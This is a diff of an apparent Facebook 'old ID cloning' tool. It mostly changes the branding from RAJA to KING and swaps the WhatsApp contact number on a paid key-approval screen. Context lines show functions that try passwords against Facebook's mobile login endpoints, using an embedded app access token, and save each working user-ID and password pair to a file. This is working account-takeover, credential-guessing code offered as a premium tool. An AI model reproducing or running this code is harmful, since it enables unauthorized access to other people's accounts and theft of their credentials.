@@ -58,7 +58,7 @@ def raja_approval():
 
     print(f"""
 {PURPLE}╔════════════════════════════════════════════════╗
-{PURPLE}║ {CYAN}              𓆩 R.A.J.A 𓆪                 {PURPLE}     ║
+{PURPLE}║ {CYAN}              𓆩 K.I.N.G 𓆪                 {PURPLE}     ║
 {PURPLE}║ {PINK}             APPROVAL SYSTEM                {PURPLE}   ║
 {PURPLE}╠════════════════════════════════════════════════╣
 {PURPLE}║ {GOLD}              ⚡ PREMIUM ACCESS ⚡            {PURPLE} ║
@@ -69,7 +69,7 @@ def raja_approval():
 
     print(
         f"{WHITE}{B} YOUR KEY {GRAY}➜ "
-        f"{PINK}{B}RAJA-{key}{R}"
+        f"{PINK}{B}KING-{key}{R}"
     )
 
     print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
@@ -94,12 +94,12 @@ def raja_approval():
             timeout=10
         ).text
 
-        if f"RAJA-{key}" in response:
+        if f"KING-{key}" in response:
 
             print(f"""
 {GREEN}╔════════════════════════════════════════════════╗
 {GREEN}║ {WHITE}             ✓ ACCESS GRANTED               {GREEN}   ║
-{GREEN}║ {CYAN}          Welcome To RAJA TOOL ⚡            {GREEN}  ║
+{GREEN}║ {CYAN}          Welcome To KING TOOL ⚡            {GREEN}  ║
 {GREEN}╚════════════════════════════════════════════════╝
 {R}""")
 
@@ -115,7 +115,7 @@ def raja_approval():
 {R}""")
 
             os.system(
-                f'xdg-open "https://wa.me/+923229120975?'
+                f'xdg-open "https://wa.me/+8801912586696?'
                 f'text=Mera-Key-Approve-Kardo-RAJA-{key}"'
             )
 
@@ -256,7 +256,7 @@ def ____banner____():
 \033[1;32m  ██║  ██║██║  ██║╚█████╔╝██║  ██║            
 \033[1;32m  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝            
 ══════════════════════════════════════════════════
-\033[1;33m║  👑 OWNER : \033[1;37mRAJA CLONER 420 YOUTUBER       
+\033[1;33m║  👑 OWNER : \033[1;37mKING CLONER VIP       
 \033[1;35m║  ⚡ TOOLS : \033[1;37mOLD ID CLONING                 
 \033[1;34m║  ✦ VERSION : \033[1;37m2.9.0 VIP                     
 ══════════════════════════════════════════════════
@@ -530,13 +530,13 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mKING\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/KING-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKING\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/KING-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -566,13 +566,13 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mKING\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/KING-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKING\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/KING-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except Exception as e:
